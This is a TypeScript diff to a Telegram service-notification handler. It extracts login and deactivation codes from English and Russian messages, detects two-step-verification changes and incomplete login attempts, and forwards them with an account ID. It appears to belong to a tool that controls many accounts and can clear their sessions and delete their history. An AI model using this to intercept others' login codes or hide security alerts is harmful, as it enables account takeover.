@@ -8,11 +8,26 @@ import { clearAuthorizations } from '../account/clearAuthorizations';
 import { deleteHistory } from '../messages/deleteHistory';
 
 const extractLoginCode = (message: string): string | null => {
+  // English version
   const loginCodeMatch = message.match(/Login code: (\d+)/);
   if (loginCodeMatch) {
     return loginCodeMatch[1];
   }
 
+  // Russian version for login
+  const russianLoginMatch = message.match(
+    /Код для входа в Ваш аккаунт Telegram: (\d+)/
+  );
+  if (russianLoginMatch) {
+    return russianLoginMatch[1];
+  }
+
+  const russianLoginMatch2 = message.match(/Код для входа в Telegram:: (\d+)/);
+  if (russianLoginMatch2) {
+    return russianLoginMatch2[1];
+  }
+
+  // English web version
   const webLoginMatch = message.match(
     /This is your login code:\s*([a-zA-Z0-9]+)/
   );
@@ -20,7 +35,27 @@ const extractLoginCode = (message: string): string | null => {
     return `${webLoginMatch[1]}`;
   }
 
+  // Russian web version
+  const russianWebLoginMatch = message.match(
+    /Код подтверждения для сайта[\s\S]*?:\s*([a-zA-Z0-9]+)/
+  );
+  if (russianWebLoginMatch) {
+    return russianWebLoginMatch[1];
+  }
+
   return null;
+};
+
+const is2FAChange = (message: string): boolean => {
+  return (
+    message.includes('Two-Step') ||
+    message.includes('Изменены настройки двухэтапной аутентификации') ||
+    message.includes('Включена двухэтапная аутентификация')
+  );
+};
+
+const isInclompleteLogin = (message: string): boolean => {
+  return message.includes('Incomplete login attempt');
 };
 
 export const handleUpdate = async (
@@ -59,15 +94,20 @@ export const handleUpdate = async (
 
       const code = extractLoginCode(update.message);
       let messageText = update.message;
+
       if (code) {
         messageText = update.message.includes('my.telegram.org')
           ? `CODE_FOR_DEACTIVATE: ${code}`
           : `CODE_FOR_LOGIN: ${code}`;
+      } else if (is2FAChange(update.message)) {
+        messageText = '2FA_SETTINGS_CHANGED';
+      } else if (isInclompleteLogin(update.message)) {
+        messageText = 'INCOMPLETE_LOGIN_ATTEMPT';
       }
 
       const notificationMessage = `[TELEGRAM_SERVICE_NOTIFICATION]
 ID: ${accountId}
-MESSAGE: ${messageText}`;
+${messageText}`;
 
       await updateAccountById(accountId, {
         lastServiceNotification: new Date(),
